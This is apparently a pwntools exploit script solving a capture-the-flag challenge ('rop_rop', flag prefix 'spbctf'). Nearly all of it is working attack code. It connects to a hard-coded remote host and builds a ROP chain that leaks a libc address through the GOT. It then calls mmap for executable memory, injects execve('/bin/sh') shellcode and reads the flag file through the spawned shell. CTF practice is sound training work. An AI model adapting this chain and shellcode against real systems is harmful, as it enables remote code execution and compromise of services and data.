#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rop_rop')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11653)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

main_addr = 0x400630
write_got_plt_addr = 0x601018
write_size = 0x601020 - write_got_plt_addr
#0 - rdi; 1 - rsi; 3 - rdx
# CALL__RAX_plus_1 = 0x0000000000400777
JMP_RBP = 0x000000000040084b
POP_RBP = 0x0000000000400578
POP_RDI = 0x0000000000400713
POP_RDX = 0x0000000000400693
POP_RSI_R15 = 0x0000000000400711

io.recvline()
pl = cyclic(40)
pl += p64(POP_RDI)
pl += p64(1) # stdout
pl += p64(POP_RSI_R15)
pl += p64(write_got_plt_addr)
pl += p64(0)
pl += p64(POP_RDX)
pl += p64(write_size)
pl += p64(POP_RBP)
pl += p64(write_got_plt_addr)
pl += p64(JMP_RBP)
pl += p64(main_addr)

io.sendline(pl)



write_addr = 0xEEFE0
libc = ELF('libc-2.31.so')
LIBC_base = u64(io.recvline()[:-3]) - write_addr
log.info(f"Libc addr {hex(LIBC_base)}")
libc.address = LIBC_base


# edi=0xcafebabe esi=128 edx=127 ecx=0 r8=-1 r9=0xdeadbeef

# mmap_addr = 0xF8C00

mmap_addr = libc.sym["mmap64"]

#mmap args = 0x100000, 0x1000, 7, 0x22, -1, 0

POP_RDI = LIBC_base + 0x000000000002679e
POP_RAX = LIBC_base + 0x000000000003ef58
SYSCALL_RET = LIBC_base + 0x000000000005819a
POP_RCX = LIBC_base + 0x000000000003b1b4 #loose eax
MOV_R9_R15_CALL_RBX = LIBC_base + 0x00000000000a9926
POP_R15 = LIBC_base + 0x000000000002679d
POP_RBX = LIBC_base + 0x0000000000030f6f
POP_RSI = LIBC_base + 0x00000000000288df
POP_RDX = LIBC_base + 0x00000000000cb28d
POP_R8_MOVE_EAX_1 = LIBC_base + 0x000000000012a976

POP_RCX_RBX = LIBC_base + 0x00000000000e4ed5
CALL_RAX = LIBC_base + 0x0000000000026cc8


addr_of_memory = 0x100000


def mov_r9_val(val):
    r = p64(POP_R15)
    r += p64(val)
    r += p64(POP_RBX)
    r += p64(POP_RBX)
    r += p64(MOV_R9_R15_CALL_RBX)
    return r


pl = cyclic(40)

# alloc memory

pl += p64(POP_RDI)
pl += p64(addr_of_memory)
pl += p64(POP_RSI)
pl += p64(0x1000)
pl += p64(POP_RDX)
pl += p64(7)
pl += p64(POP_RCX)
pl += p64(0x22)
pl += p64(POP_R8_MOVE_EAX_1)
pl += p64(0xFFFFFFFFFFFFFFFF) # -1
pl += mov_r9_val(0)
pl += p64(mmap_addr)

# send shellcode to memory

pl += p64(POP_RDI)
pl += p64(0)
pl += p64(POP_RSI)
pl += p64(addr_of_memory)
pl += p64(POP_RDX)
pl += p64(0x100)
pl += p64(POP_RAX)
pl += p64(0)
pl += p64(SYSCALL_RET)
pl += p64(addr_of_memory)

io.sendline(pl)

# asm_shellcode = """	
# 	xor rdi, rdi
# 	push rdi
# 	mov rdi, 1734437990
# 	push rdi
# 	mov rdi, 8387223334460940847
# 	push rdi
# 	xor rsi, rsi
# 	xor rdx, rdx
# 	mov rdi, rsp
# 	xor rax, rax
# 	mov al, 0x3b
# 	syscall
# 	ret
# 	"""

# shellcode = asm(asm_shellcode)

shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
io.sendline(shellcode)

sleep(0.1)

io.sendline("cat ./flag.txt")

# catch the flag

io.recvuntil("spbctf")
flag = io.recv().decode()
log.success(f"Flag: spbctf{flag}")

io.close()
